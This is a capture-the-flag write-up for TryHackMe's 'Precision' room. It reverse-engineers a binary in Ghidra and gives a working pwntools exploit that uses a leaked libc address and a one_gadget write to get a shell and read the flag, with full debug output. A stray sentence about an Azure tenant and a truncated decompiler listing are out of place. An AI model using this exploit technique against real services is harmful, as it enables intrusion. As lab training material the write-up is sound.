<h1 align="center">Precision</h1>
<p align="center">2025, November 30  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>1</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Practice your advanced Linux Exploit Development skills. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/hfb1precision">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/3e4061bb-721f-4470-a305-aeb6eb1f108e"></p>

<h2>Task 1 . Binary Exploitation  .  Precision</h2>
<h3>Precision</h3>
<p>Thanks to a tip, we are in possession of the file responsible for one of the most precise cracking tools of Void. Help us to find a vulnerability and exploit the service to get access to Void's system.<br>

To start the target machine, click the Start Machine button.<br>

Access the machine on the following IP and Port:<br>
MACHINE_IP 9004<br>

You can download the Dockerfile to debug here.<br>
You can download the files here.<br>

This challenge was originally a </p>

<p><em>In this challenge, as a cloud pentester, you will recon and attack an Azure tenant to see if you can discover the attack path</em>.</p>


<p><em>Answer the question below</em></p>
<br>
<p>

- execute nc against the provided IP and Port</p>

```bash
:~/Precision# nc xx.xx.xxx.xxx 9004

Coordinates: 0x70bd30788780

>> 
```

<br>
<p>

- download <code>Dockerfile</code></p>

```bash
FROM ubuntu:22.04
RUN apt update && apt install socat -y
RUN groupadd -r ctf && useradd -r -g ctf ctf
WORKDIR /home/ctf
EXPOSE 9004

COPY flag.txt .
COPY precision .
COPY libc.so.6 .
COPY ld-linux-x86-64.so.2 .
RUN chmod +x precision
RUN chmod +x libc.so.6
RUN chmod +x ld-linux-x86-64.so.2


CMD ["socat", "tcp-l:9004,reuseaddr,fork", "EXEC:./precision"]
```

<br>
<p>

- download <code>precision</code>.zip</p>

<img width="956" height="217" alt="image" src="https://github.com/user-attachments/assets/37ef4bf3-0b48-479b-b43c-825ee00d4752" />

<br>
<br>
<p>

- extract</p>

<img width="438" height="81" alt="image" src="https://github.com/user-attachments/assets/13157425-a316-44a9-8052-e9d3d63154ad" />

<br>
<br>
<br>

- inspect</p>

```bash
:~/Precision# ls
ld-linux-x86-64.so.2  libc.so.6  precision
```

```bash
:~/Precision# file precision
precision: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., not stripped
```

```bash
:~/Precision# file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, with debug_info, not stripped
```

```bash
:~/Precision# file ld-linux-x86-64.so.2
ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=...7, stripped
```

<br>
<p>

- execute <code>checksec</code> against <code>precision</code><br>
- identify <code>NX</code> enabled --> it´s not possible to inject or execute shellcode directly</p>

```bash
:~/Precision# checksec precision
...
[*] '...Precision/precision'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

<br>
<p>

- launch <code>Ghidra</code><br>
- select <code>File</code> > <code>New Project</code> > <code>Non-Shared-Project</code> > <code>Next</code><br>
- click <code>...</code><br>
- browse and select <code>Project Directory</code><br>
- click <code>Select Project Directory</code><br>
- type <code>Project Name</code><br>
- click <code>Finish</code></p>

<img width="924" height="159" alt="image" src="https://github.com/user-attachments/assets/32e33a93-3252-4b1a-a29d-8cdc0f0f5a3b" />

<br>
<br>
<p>
  
- select <code>File</code> > <code>Import File</code><br>
- browse and select <code>precision</code><br>
- click <code>Select File To Import</code></p>

<img width="592" height="221" alt="image" src="https://github.com/user-attachments/assets/08e5d30a-515b-4544-9d14-cda37fb4560a" />

<br>
<br>
<p>

- validate <code>Format</code>, <code>Language</code>, <code>Destination Folder</code>, and <code>Program Name</code> fields<br>
- click <code>OK</code><br>
- click <code>OK</code> again<br>
- double click </code>precision</code><br>
- click <code>Yes</code> to <code>Analyze</code> <code>precision</code><br>
- click <code>Select All</code> > <code>Analyze</code></p>

<img width="1250" height="365" alt="image" src="https://github.com/user-attachments/assets/ca33b175-1559-4d21-8593-fdc9e91235f2" />

<br>
<br>
<p>

- select <code>Search</code> > <code>For Strings ...</code> > <code>Search</code><br>
- identify <code>Coordinates</code>´s <code>location</code></p>

<img width="1223" height="473" alt="image" src="https://github.com/user-attachments/assets/b12a90ef-6ae5-4cac-b56b-b07141c92b60" />

<br>
<br>
<p>

- expand <code>Functions</code> in <code>Symbol Tree</code><br>
- scroll down<br>
- click <code>main</code></p>

<br>
<br>
<p align="center">main()<br>
<code>main</code> function calls <code>setup</code> function and print the <code>stdout</code> address.<br>Next it calls <code>getint</code> function twice.<br>Calls <code>perror</code> and <code>_exit</code> functions.</p>

```bash
void main(void)

{
  void *__ptr;
  
  setup();
  printf("\nCoordinates: %p\n",stdout);
  __ptr = (void *)getint();
  write(1,"\nFirst chance: ",0xf);
  fread(__ptr,8,1,stdin);
  __ptr = (void *)getint();
  write(1,"\nSecond chance: ",0x10);
  fread(__ptr,8,1,stdin);
  perror("!");
                    /* WARNING: Subroutine does not return */
  _exit(0x539);
}
```

<img width="1245" height="410" alt="image" src="https://github.com/user-attachments/assets/a3665899-19bb-47e9-8ac3-dd08e27ceba7" />

<br>
<br>
<p align="center">getint()<br>
<code>getint</code> reads 64 bytes from the <code>stdin</code> function, converting it to a long integer.</p>

```bash
void getint(void)

{
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(1,&DAT_00102004,4);
  fgets(local_58,0x40,stdin);
  strtoul(local_58,(char **)0x0,10);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

<img width="1248" height="462" alt="image" src="https://github.com/user-attachments/assets/ecba993e-c9ba-43e0-9c9a-571eb406619a" />

<br>
<br>
<p>

- analyze <code>libc.so.6</code> in <code>Ghidra</code></p>
<br>
<p align="center">libc.so.6</p>

<img width="1259" height="695" alt="image" src="https://github.com/user-attachments/assets/307d8bfc-eb4d-4818-9485-48a46c0f4429" />

<br>
<br>

<img width="1232" height="674" alt="image" src="https://github.com/user-attachments/assets/aa40f857-655f-4fe9-b2f4-b2ccf6e7a6ca" />

<br>
<br>
<p align="center">__strlen_avx2</p>

```bash
...
undefined * FUN_0029da10(long param_1,undefined8 param_2,long param_3)

{
  int iVar1;
  long lVar2;
  uint uVar3;
  uint uVar4;
  ulong in_RAX;
  ulong uVar5;
  ulong uVar6;
  undefined in_YMM0 [32];
  undefined in_YMM1 [32];
  undefined auVar7 [32];
  undefined auVar8 [32];
  undefined auVar9 [32];
  undefined auVar10 [32];

  uVar3 = vpmovmskb_avx2(in_YMM1);
  uVar5 = in_RAX & 0xffffffff00000000;
  if (uVar3 != 0) {
    iVar1 = 0;
    while ((uVar3 & 1) == 0) {
      iVar1 = iVar1 + 1;
      uVar3 = uVar3 >> 1 | 0x80000000;
    vzeroupper_avx();
    return (undefined *)(ulong)(uint)(iVar1 + ((int)param_1 - (int)param_3) + 0x61);
  uVar6 = param_1 + 1U | 0x7f;
                    /* WARNING: Load size is inaccurate */
    auVar7 = vmovdqa_avx(*(undefined *)(uVar6 + 1));
                    /* WARNING: Load size is inaccurate */
    auVar8 = vpminub_avx2(auVar7,*(undefined *)(uVar6 + 0x21));
                    /* WARNING: Load size is inaccurate */
    auVar9 = vmovdqa_avx(*(undefined *)(uVar6 + 0x41));
                    /* WARNING: Load size is inaccurate */
    auVar10 = vpminub_avx2(auVar9,*(undefined *)(uVar6 + 0x61));
    auVar10 = vpminub_avx2(auVar10,auVar8);
    auVar10 = vpcmpeqb_avx2(in_YMM0,auVar10);
    uVar3 = vpmovmskb_avx2(auVar10);
    uVar6 = uVar6 + 0x80;
  } while (uVar3 == 0);
  auVar7 = vpcmpeqb_avx2(in_YMM0,auVar7);
  uVar4 = vpmovmskb_avx2(auVar7);
  param_3 = uVar6 - param_3;
  if (uVar4 == 0) {
    auVar7 = vpcmpeqb_avx2(in_YMM0,auVar8);
    uVar4 = vpmovmskb_avx2(auVar7);
    if (uVar4 == 0) {
      auVar7 = vpcmpeqb_avx2(in_YMM0,auVar9);
      uVar4 = vpmovmskb_avx2(auVar7);
      uVar5 = uVar5 | uVar4 | (ulong)uVar3 << 0x20;
      lVar2 = 0;
      while ((uVar5 & 1) == 0) {
        lVar2 = lVar2 + 1;
        uVar5 = uVar5 >> 1 | 0x8000000000000000;
      vzeroupper_avx();
      return (undefined *)(lVar2 + param_3 + -0x3f);
    uVar3 = 0;
    while ((uVar4 & 1) == 0) {
      uVar3 = uVar3 + 1;
      uVar4 = uVar4 >> 1 | 0x80000000;
    vzeroupper_avx();
    return &DAT_ffffffffffffffa1 + (uVar5 | uVar3) + param_3;
  uVar3 = 0;
  while ((uVar4 & 1) == 0) {
    uVar3 = uVar3 + 1;
    uVar4 = uVar4 >> 1 | 0x80000000;
  vzeroupper_avx();
  return (undefined *)((uVar5 | uVar3) + param_3 + -0x7f);
```
<br>
<p>

- craft a script</p>

<p align="center">script.py</p>

```bash
from pwn import *

binary = './precision'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
# r = process(binary)
r = remote('xx.xx.xxx.xxx', 9004)
libc = ELF('./libc.so.6')

r.recvuntil(b'Coordinates: ')
leak = r.recvline().strip()
leak = int(leak, 16)
log.info(f'Leak: {hex(leak)}')
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
log.info(f'Libc base: {hex(libc_base)}')

libc.address = libc_base

one_gadget = libc_base + 0x10DBCA
got = libc_base + (0x7ffff7fac0b8 - 0x7ffff7d93000)

r.sendlineafter(b'>> ', str(got).encode())
r.send(p64(one_gadget))

r.sendlineafter(b'>> ', str(got).encode())
r.send(p64(one_gadget))

r.sendline(b'cat flag.txt') 

r.interactive()
```

```bash
:~/Precision# nano script.py
```

```bash
:~/Precision# python3 script.py
...
[*] '...Precision/precision'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
...
[+] Opening connection to xx.xx.xxx.xxx on port 9004: Done
...
[*] '.../Precision/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[DEBUG] Received 0x21 bytes:
    b'\n'
    b'Coordinates: 0x78867fb3a780\n'
    b'\n'
    b'>> '
[*] Leak: 0x78867fb3a780
[*] Libc base: 0x78867f920000
[DEBUG] Sent 0x10 bytes:
    b'132519063425208\n'
[DEBUG] Sent 0x8 bytes:
    00000000  ca db a2 7f  86 78 00 00                            \u2502····\u2502·x··\u2502
    00000008
[DEBUG] Received 0xf bytes:
    b'\n'
    b'First chance: '
[DEBUG] Received 0x4 bytes:
    b'\n'
    b'>> '
[DEBUG] Sent 0x10 bytes:
    b'132519063425208\n'
[DEBUG] Sent 0x8 bytes:
    00000000  ca db a2 7f  86 78 00 00                            \u2502····\u2502·x··\u2502
    00000008
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[*] Switching to interactive mode
[DEBUG] Received 0x10 bytes:
    b'\n'
    b'Second chance: '

Second chance: [DEBUG] Received 0x29 bytes:
    b'THM{••••••••••••••••••••••••••••••••••}\n'
THM{••••••••••••••••••••••••••••••••••}
[*] Got EOF while reading in interactive
 EOF
[DEBUG] Sent 0x4 bytes:
    b'EOF\n'
[*] Closed connection to XX.XX.XXX.XXX port 9004
[*] Got EOF while sending in interactive
:~/Precision#
```

<br>
<br>
<p>1.1. <em>What is the flag?</em><br>
<code>THM{••••••••••••••••••••••••••••••••••}</code></p>

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/35c742f3-fa4b-440d-8897-f70f0adb74cf"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/40d75810-9ee7-4d62-aad8-ba48d09a42c8"></p>



<h1 align="center">My TryHackMe Journey ・ 2025, November</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|30      |Hard 🚩 - Precision                    |   1    |      94ᵗʰ    |     3ʳᵈ    |     436ᵗʰ   |      5ᵗʰ     |    134,306  |    1,039    |    81     |
|30      |Medium 🚩 - Azure: Hoppity Hop         |   1    |      94ᵗʰ    |     3ʳᵈ    |     437ᵗʰ   |      5ᵗʰ     |    134,276  |    1,038    |    81     |
|30      |Medium 🚩 - Juicy                      |   1    |      94ᵗʰ    |     3ʳᵈ    |     432ⁿᵈ   |      5ᵗʰ     |    134,246  |    1,037    |    81     |
|26      |Easy 🚩 - The Case: Seven Minutes on the Seine| 1  |   94ᵗʰ    |     3ʳᵈ    |     410ᵗʰ   |      6ᵗʰ     |    134,126  |    1,036    |    81     |
|26      |Easy 🚩 - BankGPT                      |   1    |      94ᵗʰ    |     3ʳᵈ    |     443ʳᵈ   |      6ᵗʰ     |    134,066  |    1,035    |    81     |
|26      |Easy 🚩 - HealthGPT                    |   1    |      94ᵗʰ    |     3ʳᵈ    |     470ᵗʰ   |      6ᵗʰ     |    134,021  |    1,034    |    81     |
|23      |Medium 🚩 - Padelify                   |   2    |      93ʳᵈ    |     3ʳᵈ    |     436ᵗʰ   |      6ᵗʰ     |    133,976  |    1,033    |    80     |
|23      |Medium 🚩 - Farewell                   |   2    |      93ʳᵈ    |     3ʳᵈ    |     483ʳᵈ   |      6ᵗʰ     |    133,886  |    1,032    |    80     |
|23      |Medium 🔗 - WAF: Exploitation Techniques|  2    |      92ⁿᵈ    |     3ʳᵈ    |     516ᵗʰ   |      6ᵗʰ     |    133,826  |    1,031    |    80     |
|22      |Hard 🚩 - The Last Trial               |   1    |      91ˢᵗ    |     3ʳᵈ    |     532ⁿᵈ   |      6ᵗʰ     |    133,762  |    1,030    |    80     |
|22      |Medium 🔗 - Data Integrity & Model Poisoning|   1|     94ᵗʰ    |     3ʳᵈ    |     762ⁿᵈ   |      7ᵗʰ     |    133,492  |    1,029    |    80     |
|22      |Easy 🔗 - LLM Output Handling and Privacy Risks|   1|  94ᵗʰ    |     3ʳᵈ    |     809ᵗʰ   |      7ᵗʰ     |    133,444  |    1,028    |    80     |
|22      |Easy 🔗 - Advent of Cyber Prep Track   |   1    |      94ᵗʰ    |     3ʳᵈ    |     826ᵗʰ   |      8ᵗʰ     |    133,428  |    1,027    |    80     |
|19      |Easy 🔗 - WAF: Introduction            |   2    |      91ˢᵗ    |     3ʳᵈ    |     737ᵗʰ   |      7ᵗʰ     |    133,348  |    1,026    |    80     |
|19      |Easy 🔗 - Django: CVE-2025-64459       |   2    |      93ʳᵈ    |     3ʳᵈ    |     877ᵗʰ   |      8ᵗʰ     |    133,224  |    1,025    |    80     |
|19      |Easy 🔗 - Django: CVE-2025-64459       |   2    |      93ʳᵈ    |     3ʳᵈ    |     877ᵗʰ   |      8ᵗʰ     |    133,224  |    1,025    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: Insecure Data Handling| 1        |      93ʳᵈ    |     3ʳᵈ    |     894ᵗʰ   |      8ᵗʰ     |    132,207  |    1,024    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: Application Design Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     927ᵗʰ   |      8ᵗʰ     |    132,183  |    1,023    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: IAAA Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     971ˢᵗ   |      8ᵗʰ     |    132,151  |    1,022    |    80     |
|14      |Hard 🚩 - Shock and Silence            |   1    |      94ᵗʰ    |     4ᵗʰ    |     749ᵗʰ   |      7ᵗʰ     |    133,095  |    1,021    |    80     |
|14      |Easy 🔗 - Input Manipulation & Prompt Injection| 1 |   95ᵗʰ    |     4ᵗʰ    |   1,290ᵗʰ   |     12ⁿᵈ     |    132,822  |    1,020    |    80     |
|14      |Hard 🚩 - CRM Snatch                   |   1    |      95ᵗʰ    |     4ᵗʰ    |   1,526ᵗʰ   |     12ⁿᵈ     |          -  |    1,019    |    80     |
|8       |Easy 🔗 - Living of the Land Attacks   |   1    |      91ˢᵗ    |     4ᵗʰ    |   1,759ᵗʰ   |     17ᵗʰ     |    132,642  |    1,018    |    80     |
|8       |Hard 🚩 - Lost in RAMslation           |   1    |      91ˢᵗ    |     4ᵗʰ    |   2,547ᵗʰ   |     25ᵗʰ     |    132,580  |    1,017    |    80     |
|8       |Easy 🔗 - MITRE                        |   1    |       -      |     4ᵗʰ    |      -      |      -       |          -  |       -     |    80     |

</h6></div><br>

<p align="center">Global All Time:     94ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/2d417cfe-e7c8-4a27-a034-bba798416146"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/656875b1-5a58-4b49-80a8-adf118ab5274"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/dfb7156a-a1f7-418d-a710-29234011ae86"><br><br>
                  Global monthly:    436ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/e36c042d-54ac-452c-bf12-fa80e0c48fe6"><br><br>
                  Brazil monthly:       5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6273b72c-5f00-4af1-8cb6-64539a56718a"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>


